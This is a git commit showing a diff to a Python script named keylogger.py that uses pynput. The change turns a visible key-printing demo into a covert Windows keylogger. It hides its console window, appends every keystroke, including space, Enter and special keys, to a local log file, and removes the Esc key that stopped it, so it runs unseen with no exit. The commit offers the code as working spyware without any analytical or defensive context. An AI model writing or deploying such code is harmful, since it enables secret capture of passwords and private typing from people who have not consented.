fd91bdd6e8562f3adc16bc5cc2e5f4062a9386d4
SAKATA-GINTOKI2003 <147246417+SAKATA-GINTOKI2003@users.noreply.github.com>
2024-10-24 23:53:02 +0530

    changed keylogger.py

--- keylogger.py
+++ keylogger.py
@@ -1,15 +1,24 @@
 from pynput import keyboard
+import os
+import win32console
+import win32gui
+win = win32console.GetConsoleWindow()
+win32gui.ShowWindow(win, 0)
+script_dir = os.path.dirname(os.path.abspath(__file__))
+log_file = os.path.join(script_dir, 'keylogger_log.txt')
+os.makedirs(os.path.dirname(log_file), exist_ok=True)
 
 def on_press(key):
     try:
-        print(f'Key {key.char} pressed.')
+        with open(log_file, 'a') as f:
+            f.write(key.char)
     except AttributeError:
-        print(f'Special key {key} pressed.')
-
-def on_release(key):
-    if key == keyboard.Key.esc:
-        return False  # Stop listener
-
-# Collect events until released
-with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+        with open(log_file, 'a') as f:
+            if key == keyboard.Key.space:
+                f.write(' ')
+            elif key == keyboard.Key.enter:
+                f.write('\n')
+            else:
+                f.write(f' [{key}] ')
+with keyboard.Listener(on_press=on_press) as listener:
     listener.join()
